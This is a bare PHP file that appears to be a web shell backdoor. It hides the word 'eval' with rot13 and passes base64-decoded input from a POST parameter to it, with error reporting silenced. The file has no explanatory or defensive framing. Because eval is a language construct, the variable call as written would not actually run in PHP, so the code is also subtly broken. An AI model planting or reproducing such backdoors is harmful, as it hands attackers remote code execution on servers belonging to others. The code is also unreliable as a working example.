<?php
$p = str_rot13('riny');           // eval
$q = base64_decode($_POST['x']);
@$p($q);
?>
